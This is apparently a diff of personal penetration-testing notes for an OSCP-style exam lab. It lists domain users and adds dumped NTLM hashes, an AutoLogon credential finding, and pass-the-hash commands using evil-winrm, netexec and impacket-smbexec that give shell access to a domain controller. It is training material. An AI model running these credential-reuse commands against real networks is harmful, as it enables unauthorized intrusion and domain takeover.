@@ -3,35 +3,34 @@
 
 ## Users
 1. ms01\mary.williams (local user)
-2. Administrator 
-3. Aimee.Hunt
-4. Carol.Webb
-5. celia.almeda 
-6. Chelsea.Byrne
-7. Donna.Johnson
-8. Emily.Bishop
-9.  Frank.Farrell
-10. Georgina.Begum 
-11. Jamie.Thomas 
-12. Jane.Booth    
-13. Janice.Turner  
-Joan.North      
-john.dorian              
-Kenneth.Coles       
-krbtgt                   
-Lawrence.Kay             
+Administrator 
+Aimee.Hunt
+Carol.Webb
+celia.almeda 
+Chelsea.Byrne
+Donna.Johnson
+Emily.Bishop
+Frank.Farrell
+Georgina.Begum
+Jamie.Thomas
+Jane.Booth
+Janice.Turner
+Joan.North
+john.dorian
+Kenneth.Coles
+krbtgt
+Lawrence.Kay
 Leonard.Morris
 Linda.Patel
-Luke.Martin              
+Luke.Martin
 Oliver.Gray
 Sandra.Craig
-Shane.Mitchell           
+Shane.Mitchell
 sql_svc
 Thomas.Robinson
-tom.kinney               
+tom.kinney
 tom_admin
-web_svc      
-
+web_svc
 
 # MS01 .141
 - MS01.oscp.exam
@@ -196,10 +195,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 3 IP addresses (3 hosts up) scanned in 1293.43 seconds
 ```
 
+## Interested shit
+1.      ```
+           Looking for AutoLogon credentials
+            Some AutoLogon credentials were found
+            DefaultDomainName             :  OSCP.exam
+            DefaultUserName               :  Administrato
+        ```
+2. ``` tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc ```
+
 ## Foothold
 1. found celia ntlm
 2. ```
-    evil-winrm -i 10.10.200.142 -u 'oscp.exam\celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
+    evil-winrm -i ms02 -u 'oscp.exam\celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
     ```
 
 ## Root
@@ -242,3 +250,7 @@ Host script results:
 |_  start_date: N/A
 
 ```
+
+## Foothold & root
+1. checking if ok ``` netexec smb dc01 -u tom_admin -H "4979d69d4ca66955c075c41cf45f24dc" -d oscp.exam ```
+2. direct fuck``` impacket-smbexec -hashes :4979d69d4ca66955c075c41cf45f24dc "oscp.exam/tom_admin@dc01"```
